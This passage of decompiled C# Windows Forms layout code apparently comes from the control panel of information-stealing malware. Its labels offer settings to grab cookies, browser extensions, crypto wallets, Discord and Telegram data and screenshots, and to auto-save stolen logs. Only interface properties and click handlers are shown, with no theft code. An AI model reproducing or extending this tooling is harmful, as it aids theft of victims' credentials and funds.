        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).TabIndex = 150;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.refresherLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.refresherLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.refresherLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.refresherLbl).Location = new System.Drawing.Point(54, 216);
        ((System.Windows.Forms.Control)this.refresherLbl).Name = "refresherLbl";
        ((System.Windows.Forms.Control)this.refresherLbl).Size = new System.Drawing.Size(162, 21);
        ((System.Windows.Forms.Control)this.refresherLbl).TabIndex = 149;
        ((System.Windows.Forms.Control)this.refresherLbl).Text = "Auto Refresh Cookies:";
        ((System.Windows.Forms.Label)this.refresherLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.autoRefreshCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.autoRefreshCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.autoRefreshCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.autoRefreshCb).Location = new System.Drawing.Point(229, 220);
        ((System.Windows.Forms.Control)this.autoRefreshCb).Name = "autoRefreshCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.autoRefreshCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.autoRefreshCb).TabIndex = 148;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoRefreshCb).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Location = new System.Drawing.Point(547, 608);
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Name = "resetDefaultSettingBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Size = new System.Drawing.Size(150, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).TabIndex = 147;
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Text = "Reset default settings";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetDefaultSettingBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.resetDefaultSettingBtn).Click += new System.EventHandler(resetDefaultSettingBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Location = new System.Drawing.Point(412, 570);
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Name = "addNewBrowserExtBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).TabIndex = 146;
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addNewBrowserExtBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addNewBrowserExtBtn).Click += new System.EventHandler(addNewBrowserExtBtn_Click);
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).Dark = false;
        ((System.Windows.Forms.Control)this.newBrowserExtTb).Location = new System.Drawing.Point(58, 570);
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.newBrowserExtTb).Name = "newBrowserExtTb";
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.newBrowserExtTb).Size = new System.Drawing.Size(347, 23);
        ((System.Windows.Forms.Control)this.newBrowserExtTb).TabIndex = 145;
        ((GuiLib.AnimaTextBox)this.newBrowserExtTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label29).AutoSize = true;
        ((System.Windows.Forms.Control)this.label29).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label29).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label29).Location = new System.Drawing.Point(56, 550);
        ((System.Windows.Forms.Control)this.label29).Name = "label29";
        ((System.Windows.Forms.Control)this.label29).Size = new System.Drawing.Size(204, 15);
        ((System.Windows.Forms.Control)this.label29).TabIndex = 144;
        ((System.Windows.Forms.Control)this.label29).Text = "Enter a browser extension path|name:";
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.browsersExtensionsListBox).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_8;
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.browsersExtensionsListBox).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.browsersExtensionsListBox).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).Location = new System.Drawing.Point(58, 372);
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).Name = "browsersExtensionsListBox";
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).Size = new System.Drawing.Size(429, 164);
        ((System.Windows.Forms.Control)this.browsersExtensionsListBox).TabIndex = 143;
        ((System.Windows.Forms.Control)this.label30).AutoSize = true;
        ((System.Windows.Forms.Control)this.label30).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label30).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label30).Location = new System.Drawing.Point(54, 339);
        ((System.Windows.Forms.Control)this.label30).Name = "label30";
        ((System.Windows.Forms.Control)this.label30).Size = new System.Drawing.Size(351, 30);
        ((System.Windows.Forms.Control)this.label30).TabIndex = 142;
        ((System.Windows.Forms.Control)this.label30).Text = "Browser extensions grabber settings:";
        ((System.Windows.Forms.Label)this.label30).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).Dark = false;
        ((System.Windows.Forms.Control)this.privateCreatorKeyTb).Location = new System.Drawing.Point(58, 321);
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.privateCreatorKeyTb).Name = "privateCreatorKeyTb";
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.privateCreatorKeyTb).Size = new System.Drawing.Size(347, 23);
        ((System.Windows.Forms.Control)this.privateCreatorKeyTb).TabIndex = 141;
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).Text = "NOT AVAILABLE";
        ((GuiLib.AnimaTextBox)this.privateCreatorKeyTb).UseSystemPasswordChar = false;
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Location = new System.Drawing.Point(412, 321);
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Name = "showCreatorKeyBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).TabIndex = 140;
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Text = "Show";
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.showCreatorKeyBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.showCreatorKeyBtn).Click += new System.EventHandler(showCreatorKeyBtn_Click);
        ((System.Windows.Forms.Control)this.label7).AutoSize = true;
        ((System.Windows.Forms.Control)this.label7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label7).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label7).Location = new System.Drawing.Point(56, 303);
        ((System.Windows.Forms.Control)this.label7).Name = "label7";
        ((System.Windows.Forms.Control)this.label7).Size = new System.Drawing.Size(110, 15);
        ((System.Windows.Forms.Control)this.label7).TabIndex = 138;
        ((System.Windows.Forms.Control)this.label7).Text = "Creator Private Key:";
        ((System.Windows.Forms.Label)this.label7).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.metroSetButton4).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton4).Location = new System.Drawing.Point(292, 188);
        ((System.Windows.Forms.Control)this.metroSetButton4).Name = "metroSetButton4";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton4).Size = new System.Drawing.Size(195, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetButton4).TabIndex = 137;
        ((System.Windows.Forms.Control)this.metroSetButton4).Text = "Edit wallets settings";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton4).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.metroSetButton4).Click += new System.EventHandler(metroSetButton4_Click);
        ((System.Windows.Forms.Control)this.label45).AutoSize = true;
        ((System.Windows.Forms.Control)this.label45).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.label45).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label45).Location = new System.Drawing.Point(288, 19);
        ((System.Windows.Forms.Control)this.label45).Name = "label45";
        ((System.Windows.Forms.Control)this.label45).Size = new System.Drawing.Size(94, 21);
        ((System.Windows.Forms.Control)this.label45).TabIndex = 136;
        ((System.Windows.Forms.Control)this.label45).Text = "Get Discord:";
        ((System.Windows.Forms.Label)this.label45).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.discordCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.discordCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.discordCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.discordCb).Location = new System.Drawing.Point(468, 24);
        ((System.Windows.Forms.Control)this.discordCb).Name = "discordCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.discordCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.discordCb).TabIndex = 135;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.discordCb).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.e5).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e5).Location = new System.Drawing.Point(412, 271);
        ((System.Windows.Forms.Control)this.e5).Name = "chooseAutosaveDirectory";
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.e5).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).StyleManager = null;
        ((System.Windows.Forms.Control)this.e5).TabIndex = 134;
        ((System.Windows.Forms.Control)this.e5).Text = "Choose";
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.e5).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.e5).Click += new System.EventHandler(e5_Click);
        ((GuiLib.AnimaTextBox)this.e6).Dark = false;
        ((System.Windows.Forms.Control)this.e6).Location = new System.Drawing.Point(58, 271);
        ((GuiLib.AnimaTextBox)this.e6).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.e6).MultiLine = false;
        ((System.Windows.Forms.Control)this.e6).Name = "autosaveDirTb";
        ((GuiLib.AnimaTextBox)this.e6).Numeric = false;
        ((GuiLib.AnimaTextBox)this.e6).ReadOnly = false;
        ((System.Windows.Forms.Control)this.e6).Size = new System.Drawing.Size(347, 23);
        ((System.Windows.Forms.Control)this.e6).TabIndex = 133;
        ((GuiLib.AnimaTextBox)this.e6).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.e7).AutoSize = true;
        ((System.Windows.Forms.Control)this.e7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.e7).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.e7).Location = new System.Drawing.Point(55, 253);
        ((System.Windows.Forms.Control)this.e7).Name = "label40";
        ((System.Windows.Forms.Control)this.e7).Size = new System.Drawing.Size(152, 15);
        ((System.Windows.Forms.Control)this.e7).TabIndex = 132;
        ((System.Windows.Forms.Control)this.e7).Text = "Directory to auto-save logs:";
        ((System.Windows.Forms.Control)this.ce).AutoSize = true;
        ((System.Windows.Forms.Control)this.ce).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.ce).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.ce).Location = new System.Drawing.Point(288, 130);
        ((System.Windows.Forms.Control)this.ce).Name = "screenshotLbl";
        ((System.Windows.Forms.Control)this.ce).Size = new System.Drawing.Size(118, 21);
        ((System.Windows.Forms.Control)this.ce).TabIndex = 131;
        ((System.Windows.Forms.Control)this.ce).Text = "Get Screenshot:";
        ((System.Windows.Forms.Label)this.ce).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.cf).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.cf).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.cf).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cf).Location = new System.Drawing.Point(468, 135);
        ((System.Windows.Forms.Control)this.cf).Name = "screenshotCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.cf).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).StyleManager = null;
        ((System.Windows.Forms.Control)this.cf).TabIndex = 130;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.cf).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.d0).AutoSize = true;
        ((System.Windows.Forms.Control)this.d0).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.d0).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.d0).Location = new System.Drawing.Point(288, 102);
        ((System.Windows.Forms.Control)this.d0).Name = "telegramLbl";
        ((System.Windows.Forms.Control)this.d0).Size = new System.Drawing.Size(106, 21);
        ((System.Windows.Forms.Control)this.d0).TabIndex = 129;
        ((System.Windows.Forms.Control)this.d0).Text = "Get Telegram:";
        ((System.Windows.Forms.Label)this.d0).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.d1).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.d1).CheckState = MetroSet_UI.Enums.CheckState.Checked;
